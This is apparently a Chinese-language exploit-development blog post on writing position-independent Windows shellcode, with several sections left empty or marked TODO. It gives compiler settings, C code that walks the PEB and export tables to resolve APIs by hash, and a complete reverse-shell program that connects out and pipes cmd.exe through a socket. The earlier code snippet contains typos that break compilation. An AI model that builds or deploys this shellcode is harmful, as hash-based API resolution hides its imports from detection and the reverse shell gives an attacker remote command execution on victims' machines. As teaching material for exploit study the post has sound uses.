---
title: Create Shellcode in Windows
date: 2023-10-20 22:07:43
tags:
categories: Windows-PWN
---
讲解windwos下开发位置无关shellcode的基础知识，并构建框架代码和提取脚本。

参考链接：

- [Exploit开发系列教程-Windows基础&shellcode)](https://tttang.com/archive/901/)

<!-- more -->

## 理论准备

一个好的`shellcode`，应该满足以下几个条件：

- 不包含“`\X00`"：避免`shellcode`被截断

- 不能直接调用Windows API，而应该从`Windows`的数据结构体中寻找需要的函数。

- 自包含：仅使用栈变量

  错误写法：

  ```
  char *v = char[100];
  char v[] = "hello world"; # 存储在.rdata节
  char *v = "hello world"; # 存储在.data节
  ```

  正确写法：

  ```
  char str[] = { 'I', '\'', 'm', ' ', 'a', ' ', 's', 't', 'r', 'i', 'n', 'g', '\0' };
  ```

  但当字符串过长时，仍会将字符串放到.rdata节，这个就需要使用`python`脚本从`.rdata`中将字符串提取出来，同时修改重定位信息，以修复`shellcode`。

## 环境准备

### 配置选项

编译选项

- 关闭sdl
- 关闭安全检查 /GS-
- 优化级别：/O1(Minimize Size)
- 关闭自动内联：/Ob1(Only __inline)
- 其它：/Oi /Os /GL /Gy

链接选项

- 常规
  - /INCREMENTAL:NO
- 调试
  - /MAP(生成存储EXE结构信息的映射文件)（用于后期去除函数和不被使用的数据）
  - 自定义映射文件名：*Map File Name: mapfile
- 优化
  - References: Yes(/OPT:REF)
  - 指定代码节中函数的顺序
    * Enable COMPAT Folding: Yes(/OPT:ICF)
    * Function Order: function_order.txt（指定必须出现在代码节中函数的顺序，我们将entryPoint放在第一个位置，具体要填的函数名可以查看 映射文件mapgfile获得。

## 开始实践

### getProcAddrByHash

fs->TEB 

fs:[30h]->PEB

```
dt _TEB @$teb
dt _PEB @$peb
dt _PEB_LDR_DATA (xxx)
dt _LIST_ENTRY (xxx)
dt _LDR_DATA_TABLE_ENTRY
```

部分命令结果

```c
0:000> dt _TEB @$teb
ntdll!_TEB
   +0x000 NtTib            : _NT_TIB
   +0x01c EnvironmentPointer : (null) 
   +0x020 ClientId         : _CLIENT_ID
   +0x028 ActiveRpcHandle  : (null) 
   +0x02c ThreadLocalStoragePointer : 0x00da5548 Void
   +0x030 ProcessEnvironmentBlock : 0x009a0000 _PEB
   ...
```

```
0:000> dt _LDR_DATA_TABLE_ENTRY
ntdll!_LDR_DATA_TABLE_ENTRY
   +0x000 InLoadOrderLinks : _LIST_ENTRY
   +0x008 InMemoryOrderLinks : _LIST_ENTRY
   +0x010 InInitializationOrderLinks : _LIST_ENTRY
   +0x018 DllBase          : Ptr32 Void
   +0x01c EntryPoint       : Ptr32 Void
   +0x020 SizeOfImage      : Uint4B
   +0x024 FullDllName      : _UNICODE_STRING
   +0x02c BaseDllName      : _UNICODE_STRING
   ...
```

涉及到的结构体的关系图如下：

【TODO!】

代码实现：

```c
DWORD getHash(const char* str) {
	DWORD h = 0;
	while(*str) {
		h = (h >> 13) | (h << (32-13)); //ROR h,13
		h += *str >= 'a' ? *str-32 : *str; // 转换为大写字母
		str++;
	}
	return h;
}

DWORD getFunctionHash(const char* moduleName, const char* funtionName) {
    return getHash(moduleName) + getHash(functionName);
}

_inline PEB* getPEB() {
    PEB *p;
    __asm {
        mov eax, fs:[30h] // fs指向TEB, fs:[30h]指向PEB
        mov p, eax
    }
    return p;
}

_inline LDR_DATA_TABLE_ENTRY* getDataTableEntry(LIST_ENTRY* ptr) {
    return (LDR_DATA_TABLE_ENTRY*)((BYTE*)ptr - 8);
}

DWORD getProcAddrByHash(DWORD hash) {
    // 首先获取PEB(Process Environment Block)的地址
    PEB* peb = getPEB();
    LIST_ENTRY* first = peb->Ldr->InMemoryOrderModuleList.Flink;
    LIST_ENTRY* ptr = first;
    do {
        LDR_DATA_TABLE_ENTRY* dte = getDataTableEntry(ptr);
        ptr = ptr->Flink;
        BYTE* baseAddress = (Byte*)dte->DllBase;
        if(!baseAddress)
            continue;
        IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)baseAddress;
        IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)(baseAddress + dosHeader->e_lfanew);
        
        DWORD iedRVA = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
        if(!iedRVA) // 没有导出表
            continue;
        IMAGE_EXPORT_DIRECTORY* ied = (IMAGE_EXPORT_DIRECTORY*)(baseAddress + iedRVA);
        char* moduleName = (char*)(baseAddress + ied->Name);
        DWORD moduleHash = getHash(moduleName);
        
        DWORD *nameRVAs = (DWORD *)(baseAddress + ied->AddressOfNames);
        for(DWORD i = 0; i < ied->NumberOfNames; ++i) {
            char *functionName = (char *)(baseAddress + nameRVAs[i]);
            if(hash == moduleHash + getHash(functionName)) {
                WORD oridinal = ((WORD *)(baseAddress + ied->AddressOfNameOrdinals))[i];
                DWORD functionRVA = ((DWORD *)(baseAddress + ied->AddressOfFunctions))[ordinal];
                return baseAddress + functionRVA;
            }
        }
        
    } while(ptr != first);
    
    return NULL;
}
```

### DefineFuncPtr

> 一个宏，便于定义已导入的函数

实现：

```c++
#define DefineFuncPtr(name)	decltype(name) *My_##name = (decltype(name) *)getProcAddrByHash(HASH_##name)
```

使用：

```c
DWORD hash = getFunctionHash("ws2_32.dll", "WSAStartup"); // 得到0x2ddcd540
```

```c
#define HASH_WSAStartup	0x2ddcd540
DefineFuncPtr(WSAStartup);
```

之后就可以使用`My_WSAStartup`调用`WSAStartup`函数。

> 注：在使用前，要确保所需函数所在的模块，已经被加载到内存中。
>
> 可以主动调用LoadLibrary函数，以确保这一点。
>
> ```c
> DefineFuncPtr(LoadLibrarya); // 在kernel32.dll中，一定已经被加载
> My_LoadLibrary("ws2_32.dll");
> ```

### entryPoint

### main

### Python脚本



### shellcode范例

一个简单的`reverse shell`：

```c
#include <WinSock2.h>               // must preceed #include <windows.h>
#include <WS2tcpip.h>
#include <windows.h>
#include <winnt.h>
#include <winternl.h>
#include <stddef.h>
#include <stdio.h>
 
#define htons(A) ((((WORD)(A) & 0xff00) >> 8) | (((WORD)(A) & 0x00ff) << 8))
 
_inline PEB *getPEB() {
    PEB *p;
    __asm {
        mov     eax, fs:[30h]
        mov     p, eax
    }
    return p;
}
 
DWORD getHash(const char *str) {
    DWORD h = 0;
    while (*str) {
        h = (h >> 13) | (h << (32 - 13));       // ROR h, 13
        h += *str >= 'a' ? *str - 32 : *str;    // convert the character to uppercase
        str++;
    }
    return h;
}
 
DWORD getFunctionHash(const char *moduleName, const char *functionName) {
    return getHash(moduleName) + getHash(functionName);
}
 
LDR_DATA_TABLE_ENTRY *getDataTableEntry(const LIST_ENTRY *ptr) {
    int list_entry_offset = offsetof(LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
    return (LDR_DATA_TABLE_ENTRY *)((BYTE *)ptr - list_entry_offset);
}
 
// NOTE: This function doesn't work with forwarders. For instance, kernel32.ExitThread forwards to
//       ntdll.RtlExitUserThread. The solution is to follow the forwards manually.
PVOID getProcAddrByHash(DWORD hash) {
    PEB *peb = getPEB();
    LIST_ENTRY *first = peb->Ldr->InMemoryOrderModuleList.Flink;
    LIST_ENTRY *ptr = first;
    do {                            // for each module
        LDR_DATA_TABLE_ENTRY *dte = getDataTableEntry(ptr);
        ptr = ptr->Flink;
 
        BYTE *baseAddress = (BYTE *)dte->DllBase;
        if (!baseAddress)           // invalid module(???)
            continue;
        IMAGE_DOS_HEADER *dosHeader = (IMAGE_DOS_HEADER *)baseAddress;
        IMAGE_NT_HEADERS *ntHeaders = (IMAGE_NT_HEADERS *)(baseAddress + dosHeader->e_lfanew);
        DWORD iedRVA = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
        if (!iedRVA)                // Export Directory not present
            continue;
        IMAGE_EXPORT_DIRECTORY *ied = (IMAGE_EXPORT_DIRECTORY *)(baseAddress + iedRVA);
        char *moduleName = (char *)(baseAddress + ied->Name);
        DWORD moduleHash = getHash(moduleName);
 
        // The arrays pointed to by AddressOfNames and AddressOfNameOrdinals run in parallel, i.e. the i-th
        // element of both arrays refer to the same function. The first array specifies the name whereas
        // the second the ordinal. This ordinal can then be used as an index in the array pointed to by
        // AddressOfFunctions to find the entry point of the function.
        DWORD *nameRVAs = (DWORD *)(baseAddress + ied->AddressOfNames);
        for (DWORD i = 0; i < ied->NumberOfNames; ++i) {
            char *functionName = (char *)(baseAddress + nameRVAs[i]);
            if (hash == moduleHash + getHash(functionName)) {
                WORD ordinal = ((WORD *)(baseAddress + ied->AddressOfNameOrdinals))[i];
                DWORD functionRVA = ((DWORD *)(baseAddress + ied->AddressOfFunctions))[ordinal];
                return baseAddress + functionRVA;
            }
        }
    } while (ptr != first);
 
    return NULL;            // address not found
}
 
#define HASH_LoadLibraryA           0xf8b7108d
#define HASH_WSAStartup             0x2ddcd540
#define HASH_WSACleanup             0x0b9d13bc
#define HASH_WSASocketA             0x9fd4f16f
#define HASH_WSAConnect             0xa50da182
#define HASH_CreateProcessA         0x231cbe70
#define HASH_inet_ntoa              0x1b73fed1
#define HASH_inet_addr              0x011bfae2
#define HASH_getaddrinfo            0xdc2953c9
#define HASH_getnameinfo            0x5c1c856e
#define HASH_ExitThread             0x4b3153e0
#define HASH_WaitForSingleObject    0xca8e9498
 
#define DefineFuncPtr(name)     decltype(name) *My_##name = (decltype(name) *)getProcAddrByHash(HASH_##name)
 
int entryPoint() {
//  printf("0x%08x\n", getFunctionHash("kernel32.dll", "WaitForSingleObject"));
//  return 0;
 
    // NOTE: we should call WSACleanup() and freeaddrinfo() (after getaddrinfo()), but
    //       they're not strictly needed.
 
    DefineFuncPtr(LoadLibraryA);
 
    My_LoadLibraryA("ws2_32.dll");
 
    DefineFuncPtr(WSAStartup);
    DefineFuncPtr(WSASocketA);
    DefineFuncPtr(WSAConnect);
    DefineFuncPtr(CreateProcessA);
    DefineFuncPtr(inet_ntoa);
    DefineFuncPtr(inet_addr);
    DefineFuncPtr(getaddrinfo);
    DefineFuncPtr(getnameinfo);
    DefineFuncPtr(ExitThread);
    DefineFuncPtr(WaitForSingleObject);
 
    const char *hostName = "127.0.0.1";
    const int hostPort = 123;
 
    WSADATA wsaData;
 
    if (My_WSAStartup(MAKEWORD(2, 2), &wsaData))
        goto __end;         // error
    SOCKET sock = My_WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    if (sock == INVALID_SOCKET)
        goto __end;
 
    addrinfo *result;
    if (My_getaddrinfo(hostName, NULL, NULL, &result))
        goto __end;
    char ip_addr[16];
    My_getnameinfo(result->ai_addr, result->ai_addrlen, ip_addr, sizeof(ip_addr), NULL, 0, NI_NUMERICHOST);
 
    SOCKADDR_IN remoteAddr;
    remoteAddr.sin_family = AF_INET;
    remoteAddr.sin_port = htons(hostPort);
    remoteAddr.sin_addr.s_addr = My_inet_addr(ip_addr);
 
    if (My_WSAConnect(sock, (SOCKADDR *)&remoteAddr, sizeof(remoteAddr), NULL, NULL, NULL, NULL))
        goto __end;
 
    STARTUPINFOA sInfo;
    PROCESS_INFORMATION procInfo;
    SecureZeroMemory(&sInfo, sizeof(sInfo));        // avoids a call to _memset
    sInfo.cb = sizeof(sInfo);
    sInfo.dwFlags = STARTF_USESTDHANDLES;
    sInfo.hStdInput = sInfo.hStdOutput = sInfo.hStdError = (HANDLE)sock;
    My_CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &sInfo, &procInfo);
 
    // Waits for the process to finish.
    My_WaitForSingleObject(procInfo.hProcess, INFINITE);
 
__end:
    My_ExitThread(0);
 
    return 0;
}
 
int main() {
    return entryPoint();
}
```

### 函数分析

TODO!